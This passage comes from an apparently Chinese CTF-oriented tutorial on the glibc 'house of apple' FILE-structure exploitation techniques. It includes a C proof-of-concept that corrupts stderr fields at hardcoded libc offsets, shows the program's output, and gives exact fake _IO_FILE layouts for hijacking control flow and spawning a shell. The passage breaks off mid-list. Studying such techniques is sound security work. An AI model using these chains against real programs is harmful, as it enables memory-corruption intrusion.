class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate a 0x100 chunk&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    <span class="type">size_t</span> *tmp = p1;</span><br><span class="line">    <span class="type">size_t</span> old_value = <span class="number">0x1122334455667788</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p1[i] = old_value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="type">void</span> *)puts_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_write_ptr_addr = puts_addr + <span class="number">0x1997b8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_IO_write_ptr address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_write_ptr_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_flags2_addr = puts_addr + <span class="number">0x199804</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_flags2 address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_flags2_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_wide_data_addr = puts_addr + <span class="number">0x199830</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_wide_data address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_wide_data_addr);</span><br><span class="line">    <span class="type">size_t</span> sdterr_vtable_addr = puts_addr + <span class="number">0x199868</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;vtable address: %p\n&quot;</span>, (<span class="type">void</span> *)sdterr_vtable_addr);</span><br><span class="line">    <span class="type">size_t</span> _IO_wstrn_jumps_addr = puts_addr + <span class="number">0x194ed0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_IO_write_ptr to -1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_write_ptr_addr = (<span class="type">size_t</span>)<span class="number">-1</span>;<span class="comment">//满足_IO_OVERFLOW (fp, EOF)</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_flags2 to 8&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_flags2_addr = <span class="number">8</span>;<span class="comment">//io_wsetb绕过</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: replace stderr-&gt;_wide_data with the allocated chunk&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_wide_data_addr = (<span class="type">size_t</span>)p1;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;vtable with _IO_wstrn_jumps&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)sdterr_vtable_addr = (<span class="type">size_t</span>)_IO_wstrn_jumps_addr;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: call fcloseall and trigger house of apple&quot;</span>);</span><br><span class="line">    fcloseall();</span><br><span class="line">    tmp = p1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[*] allocate a <span class="number">0x100</span> chunk</span><br><span class="line">===========================old value=======================</span><br><span class="line">[<span class="number">0x55cfb956d2a0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55cfb956d2b0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55cfb956d2c0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55cfb956d2d0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">===========================old value=======================</span><br><span class="line">[*] <span class="built_in">puts</span> address: <span class="number">0x7f648b8a6ef0</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_IO_write_ptr address: <span class="number">0x7f648ba406a8</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_flags2 address: <span class="number">0x7f648ba406f4</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_wide_data address: <span class="number">0x7f648ba40720</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;vtable address: <span class="number">0x7f648ba40758</span></span><br><span class="line">[*] _IO_wstrn_jumps address: <span class="number">0x7f648ba3bdc0</span></span><br><span class="line">[+] step <span class="number">1</span>: change <span class="built_in">stderr</span>-&gt;_IO_write_ptr to <span class="number">-1</span></span><br><span class="line">[+] step <span class="number">2</span>: change <span class="built_in">stderr</span>-&gt;_flags2 to <span class="number">8</span></span><br><span class="line">[+] step <span class="number">3</span>: replace <span class="built_in">stderr</span>-&gt;_wide_data with the allocated chunk</span><br><span class="line">[+] step <span class="number">4</span>: replace <span class="built_in">stderr</span>-&gt;vtable with _IO_wstrn_jumps</span><br><span class="line">[+] step <span class="number">5</span>: call fcloseall and trigger house of apple</span><br><span class="line">===========================new value=======================</span><br><span class="line">[<span class="number">0x55cfb956d2a0</span>]: <span class="number">0x00007f648ba40770</span>  <span class="number">0x00007f648ba40870</span></span><br><span class="line">[<span class="number">0x55cfb956d2b0</span>]: <span class="number">0x00007f648ba40770</span>  <span class="number">0x00007f648ba40770</span></span><br><span class="line">[<span class="number">0x55cfb956d2c0</span>]: <span class="number">0x00007f648ba40770</span>  <span class="number">0x00007f648ba40770</span></span><br><span class="line">[<span class="number">0x55cfb956d2d0</span>]: <span class="number">0x00007f648ba40770</span>  <span class="number">0x00007f648ba40870</span></span><br><span class="line">===========================new value=======================</span><br></pre></td></tr></table></figure><p>可以看到_wide_data指向的连续八个size_t内存都被修改</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>从上面的分析可以，在只给了<code>1</code>次<code>largebin attack</code>的前提下，能利用<code>_IO_wstrn_overflow</code>函数将任意地址空间上的值修改为一个已知地址，并且这个已知地址通常为堆地址。那么，当伪造两个甚至多个<code>_IO_FILE</code>结构体，并将这些结构体通过<code>chain</code>字段串联起来就能进行组合利用。基于此，有至少四种利用思路。</p><h3 id="思路一：修改tcache线程变量"><a href="#思路一：修改tcache线程变量" class="headerlink" title="思路一：修改tcache线程变量"></a>思路一：修改<code>tcache</code>线程变量</h3><p>该思路需要借助<code>house of pig</code>的思想，利用<code>_IO_str_overflow</code>中的<code>malloc</code>进行任意地址分配，<code>memcpy</code>进行任意地址覆盖。其代码片段如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">      <span class="type">char</span> *new_buf;</span><br><span class="line">      <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base; <span class="comment">// 赋值为old_buf</span></span><br><span class="line">      <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 这里任意地址分配</span></span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen); <span class="comment">// 劫持_IO_buf_base后即可任意地址写任意值</span></span><br><span class="line">          <span class="built_in">free</span> (old_buf);</span><br><span class="line">      <span class="comment">// .......</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>利用步骤如下：</p><ul><li>伪造至少两个<code>_IO_FILE</code>结构体</li><li>第一个<code>_IO_FILE</code>结构体执行<code>_IO_OVERFLOW</code>的时候，利用<code>_IO_wstrn_overflow</code>函数修改<code>tcache</code>全局变量为已知值，也就控制了<code>tcache bin</code>的分配</li><li>第二个<code>_IO_FILE</code>结构体执行<code>_IO_OVERFLOW</code>的时候，利用<code>_IO_str_overflow</code>中的<code>malloc</code>函数任意地址分配，并使用<code>memcpy</code>使得能够<strong>任意地址写任意值</strong></li><li>利用两次任意地址写任意值修改<code>pointer_guard</code>和<code>IO_accept_foreign_vtables</code>的值绕过<code>_IO_vtable_check</code>函数的检测（或者利用一次任意地址写任意值修改<code>libc.got</code>里面的函数地址，很多<code>IO</code>流函数调用<code>strlen/strcpy/memcpy/memset</code>等都会调到<code>libc.got</code>里面的函数）</li><li>利用一个<code>_IO_FILE</code>，随意伪造<code>vtable</code>劫持程序控制流即可</li></ul><p>因为可以已经任意地址写任意值了，所以这可以控制的变量和结构体非常多，也非常地灵活，需要结合具体的题目进行利用，比如题目中<code>_IO_xxx_jumps</code>映射的地址空间可写的话直接修改其函数指针即可。</p><h3 id="思路二：修改mp-结构体"><a href="#思路二：修改mp-结构体" class="headerlink" title="思路二：修改mp_结构体"></a>思路二：修改<code>mp_</code>结构体</h3><p>该思路与上述思路差不多，不过对<code>tcachebin</code>分配的劫持是通过修改<code>mp_.tcache_bins</code>这个变量。打这个结构体的好处是在攻击远程时不需要爆破地址，因为<strong>线程全局变量、<code>tls</code>结构体的地址本地和远程并不一定是一样的，有时需要爆破。</strong></p><p>利用步骤如下：</p><ul><li>伪造至少两个<code>_IO_FILE</code>结构体</li><li>第一个<code>_IO_FILE</code>结构体执行<code>_IO_OVERFLOW</code>的时候，利用<code>_IO_wstrn_overflow</code>函数修改<code>mp_.tcache_bins</code>为很大的值，使得很大的<code>chunk</code>也通过<code>tcachebin</code>去管理</li><li>接下来的过程与上面的思路是一样的</li></ul><h3 id="思路三：修改pointer-guard线程变量之house-of-emma"><a href="#思路三：修改pointer-guard线程变量之house-of-emma" class="headerlink" title="思路三：修改pointer_guard线程变量之house of emma"></a>思路三：修改<code>pointer_guard</code>线程变量之<code>house of emma</code></h3><p>该思路其实就是<code>house of apple + house of emma</code>。</p><p>利用步骤如下：</p><ul><li>伪造两个<code>_IO_FILE</code>结构体</li><li>第一个<code>_IO_FILE</code>结构体执行<code>_IO_OVERFLOW</code>的时候，利用<code>_IO_wstrn_overflow</code>函数修改<code>tls</code>结构体<code>pointer_guard</code>的值为已知值</li><li>第二个<code>_IO_FILE</code>结构体用来做<code>house of emma</code>利用即可控制程序执行流</li></ul><h3 id="思路四：修改global-max-fast全局变量"><a href="#思路四：修改global-max-fast全局变量" class="headerlink" title="思路四：修改global_max_fast全局变量"></a>思路四：修改<code>global_max_fast</code>全局变量</h3><p>这个思路也很灵活，修改掉这个变量后，直接释放超大的<code>chunk</code>，去覆盖掉<code>point_guard</code>或者<code>tcache</code>变量。我称之为<code>house of apple + house of corrision</code>。</p><p>利用过程与前面也基本是大同小异，就不在此详述了。</p><hr><p>其实也有其他的思路，比如还可以劫持<code>main_arena</code>，不过这个结构体利用起来会更复杂，所需要的空间将更大。而在上述思路的利用过程中，可以选择错位构造<code>_IO_FILE</code>结构体，只需要保证关键字段满足要求即可，这样可以更加节省空间。</p><h2 id="例题-7"><a href="#例题-7" class="headerlink" title="例题"></a>例题</h2><h1 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h1><h2 id="概要-15"><a href="#概要-15" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>在house of apple1的基础上,在只劫持<code>_wide_data</code>的条件下控制程序的执行流,<code>house of apple2</code>会提出几条新的<code>IO</code>利用链，在劫持<code>_IO_FILE-&gt;_wide_data</code>的基础上，直接控制程序执行流.</p><p><strong>利用条件:</strong></p><ol><li>能控制程序执行<code>IO</code>操作，包括但不限于：从<code>main</code>函数返回、调用<code>exit</code>函数、通过<code>__malloc_assert</code>触发</li><li>能够泄露堆地址和libc基址</li><li>能控制<code>_IO_FILE</code>的<code>vtable</code>和<code>_wide_data</code>，一般使用<code>largebin attack</code>去控制</li></ol><p><strong>利用效果:</strong>控制流</p><p><strong>有效版本:</strong>除了与_IO_wstrn_jumps有关的有效版本为2.36及以前,<strong>其他为ALL版本有效</strong></p><h2 id="原理-15"><a href="#原理-15" class="headerlink" title="原理"></a>原理</h2><p><code>stdin/stdout/stderr</code>这三个<code>_IO_FILE</code>结构体使用的是<code>_IO_file_jumps</code>这个<code>vtable</code>，而当需要调用到<code>vtable</code>里面的函数指针时，会使用宏去调用。以<code>_IO_file_overflow</code>调用为例，<code>glibc</code>中调用的代码片段分析如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br></pre></td></tr></table></figure><p>其中，<code>IO_validate_vtable</code>函数负责检查<code>vtable</code>的合法性，会判断<code>vtable</code>的地址是不是在一个合法的区间。如果<code>vtable</code>的地址不合法，程序将会异常终止。</p><p>观察<code>struct _IO_wide_data</code>结构体，发现其对应有一个<code>_wide_vtable</code>成员。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在调用<code>_wide_vtable</code>虚表里面的函数时，同样是使用宏去调用，仍然以<code>vtable-&gt;_overflow</code>调用为例，所用到的宏依次为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure><p>可以看到，在调用<code>_wide_vtable</code>里面的成员函数指针时，<strong>没有关于vtable的合法性检查</strong>。</p><p>因此，我们可以劫持<code>IO_FILE</code>的<code>vtable</code>为<code>_IO_wfile_jumps</code>，控制<code>_wide_data</code>为可控的堆地址空间，进而控制<code>_wide_data-&gt;_wide_vtable</code>为可控的堆地址空间。控制程序执行<code>IO</code>流函数调用，最终调用到<code>_IO_Wxxxxx</code>函数即可控制程序的执行流。</p><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>目前在<code>glibc</code>源码中搜索到的<code>_IO_WXXXXX</code>系列函数的调用只有<code>_IO_WSETBUF</code>、<code>_IO_WUNDERFLOW</code>、<code>_IO_WDOALLOCATE</code>和<code>_IO_WOVERFLOW</code>。<br>其中<code>_IO_WSETBUF</code>和<code>_IO_WUNDERFLOW</code>目前无法利用或利用困难，其余的均可构造合适的<code>_IO_FILE</code>进行利用。这里给出我总结的几条比较好利用的链。以下使用<code>fp</code>指代<code>_IO_FILE</code>结构体变量。</p><h3 id="利用-IO-wfile-overflow函数控制程序执行流"><a href="#利用-IO-wfile-overflow函数控制程序执行流" class="headerlink" title="利用_IO_wfile_overflow函数控制程序执行流"></a>利用_IO_wfile_overflow函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p><ul><li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>sh;</code>，注意前面有两个空格</li><li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li><li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li><li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li><li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li></ul><p>函数的调用链如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure><p>详细分析如下：<br>首先看<code>_IO_wfile_overflow</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wdoallocbuf (f);<span class="comment">// 需要走到这里</span></span><br><span class="line">      <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要满足<code>f-&gt;_flags &amp; _IO_NO_WRITES == 0</code>并且<code>f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0</code>和<code>f-&gt;_wide_data-&gt;_IO_write_base == 0</code></p><p>然后看<code>_IO_wdoallocbuf</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)<span class="comment">// _IO_WXXXX调用</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">             fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdoallocbuf)</span><br></pre></td></tr></table></figure><p>需要满足<code>fp-&gt;_wide_data-&gt;_IO_buf_base == 0</code>和<code>fp-&gt;_flags &amp; _IO_UNBUFFERED == 0</code>。</p><h3 id="利用-IO-wfile-underflow-mmap函数控制程序执行流"><a href="#利用-IO-wfile-underflow-mmap函数控制程序执行流" class="headerlink" title="利用_IO_wfile_underflow_mmap函数控制程序执行流"></a>利用_IO_wfile_underflow_mmap函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p><ul><li><code>_flags</code>设置为<code>~4</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>sh;</code>，注意前面有个空格</li><li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li><li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li><li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li><li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li><li><code>_wide_data-&gt;_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code></li><li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = 